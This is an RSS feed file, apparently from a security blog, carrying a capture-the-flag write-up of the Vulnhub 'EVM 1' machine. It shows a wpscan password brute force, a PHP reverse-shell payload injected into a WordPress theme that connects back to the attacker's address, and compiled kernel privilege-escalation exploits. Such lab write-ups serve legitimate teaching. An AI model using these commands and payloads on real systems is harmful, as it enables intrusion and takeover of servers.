@@ -1,0 +1,178 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Password Bruteforce on ikuamike</title>
+    <link>https://blog.ikuamike.io/tags/password-bruteforce/</link>
+    <description>Recent content in Password Bruteforce on ikuamike</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>© Michael Ikua</copyright>
+    <lastBuildDate>Fri, 05 Mar 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/password-bruteforce/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Vulnhub: EVM 1</title>
+      <link>https://blog.ikuamike.io/posts/2021/evm/</link>
+      <pubDate>Fri, 05 Mar 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.ikuamike.io/posts/2021/evm/</guid>
+      <description></description>
+      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Difficulty&lt;/th&gt;
+&lt;th&gt;Release Date&lt;/th&gt;
+&lt;th&gt;Author&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Beginner&lt;/td&gt;
+&lt;td&gt;2 Nov 2019&lt;/td&gt;
+&lt;td&gt;Ic0de&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
+&lt;p&gt;This was an easy box, initial foothold was on wordpress. You needed to bruteforce the admin creds
+then get a reverse shell via editing a theme file to get the reverse shell. Escalating to root
+was straightforward as we found the root password in a txt file. Some kernel exploits could have also
+been used for privilege escalation.&lt;/p&gt;
+&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
+&lt;p&gt;Nmap&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.103
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00028s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+53/tcp  open  domain      ISC BIND 9.10.3-P4 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| dns-nsid:
+|_  bind.version: 9.10.3-P4-Ubuntu
+80/tcp  open  http        Apache httpd 2.4.18 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.18 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_http-title: Apache2 Ubuntu Default Page: It works
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: CAPA RESP-CODES SASL AUTH-RESP-CODE TOP UIDL PIPELINING
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: more post-login LOGINDISABLEDA0001 ID LOGIN-REFERRALS listed IMAP4rev1 have capabilities OK ENABLE Pre-login LITERAL+ SASL-IR IDLE
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
+|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;unknown&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| smb-os-discovery:
+|   OS: Windows 6.1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Samba 4.3.11-Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine
+|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
+|   Domain name: &lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
+|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine
+|_  System time: 2021-03-04T15:43:32-05:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2021-03-04T20:43:32
+|_  start_date: N/A
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
+&lt;h2 id=&#34;samba-139445&#34;&gt;Samba (139,445)&lt;/h2&gt;
+&lt;p&gt;Running smbmap and smbclient there&amp;rsquo;s not much there.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;smbmap -R -H 192.168.56.103
+
+smbclient -L &lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;192.168.56.103 -N
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;From enum4linux-ng we only get a username&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;enum4linux-ng -A -R 192.168.56.103
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm2.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h2 id=&#34;http-80&#34;&gt;HTTP (80)&lt;/h2&gt;
+&lt;p&gt;Visiting the ip on the browser there&amp;rsquo;s only the apache default page.&lt;/p&gt;
+&lt;p&gt;Running directory bruteforce, we discover wordpress.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm3.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Wordpress:&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm4.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Some of the comments hint towards bruteforcing credentials.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm5.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Bruteforcing the login page on wordpress we get the password &lt;code&gt;24992499&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wpscan --url http://192.168.56.103/wordpress/ -U c0rrupt3d_brain -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -t &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm7.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h1 id=&#34;shell-as-www-data&#34;&gt;Shell as www-data&lt;/h1&gt;
+&lt;p&gt;With admin access we can edit one of the wordpress theme files to get a reverse shell with this php payload.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm6.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Loading the following url we get a reverse shell.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm8.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Changing directory to /home there&amp;rsquo;s one user&amp;rsquo;s folder. Looking at all the files in this directory there&amp;rsquo;s a hidden
+file with the root user&amp;rsquo;s password.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm9.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h1 id=&#34;shell-as-root&#34;&gt;Shell as root&lt;/h1&gt;
+&lt;p&gt;Using the password &lt;code&gt;willy26&lt;/code&gt; I switched to the root user.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm10.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
+&lt;p&gt;Privilege escalation could have also been achieved via kernel exploit.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm11.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;The box is running ubuntu 16.04.3 and kernel version 4.4.0-87. Searching for exploits using searchsploit
+we get several hits.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm12.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Getting the first local privilege escalation script and transferring the compiled binary to the target, it works.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;searchsploit -m &lt;span style=&#34;color:#ae81ff&#34;&gt;45010&lt;/span&gt;
+
+gcc 45010.c -o pwn
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm13.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;The second one &lt;code&gt;44298&lt;/code&gt; also works.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm14.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;</content>
+    </item>
+    
+  </channel>
+</rss>
